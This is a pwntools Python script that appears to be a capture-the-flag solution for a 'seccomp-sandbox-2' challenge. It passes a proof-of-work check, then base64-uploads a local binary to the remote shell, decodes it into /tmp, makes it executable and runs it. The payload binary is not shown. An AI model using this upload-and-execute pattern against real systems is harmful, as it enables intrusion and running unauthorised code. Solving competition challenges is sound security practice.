from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

def connect():
    f  = remote("seccomp-sandbox-2.chals.kitctf.de",1337,ssl=True)
    cmd = f.readline().split(b": ")[1][:-1]
    ff = process(cmd.split(b" "))
    ff.readuntil(b"hashcash token: ")
    f.send(ff.readline())
    f.readuntil(b"Your Instance is\n\n")
    res = f.readline()[:-1]
    ff.close()
    f.close()
    return res

if (1):
    host = connect()
    print(host)
    p = remote(host,1337,ssl=True)
else:
    p = remote("0.0.0.0",1337)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
def cmd(c):
    sla(b"$ ",c)
import base64
with open("./n132",'rb') as f:
    base = base64.b64encode(f.read())
base = base.decode()
cmd(f"echo {base} > /tmp/base".encode())
cmd(b"cat /tmp/base | base64 -d  > /tmp/n132")
cmd(b"chmod +x /tmp/n132")
cmd(b"/tmp/n132")
p.interactive()
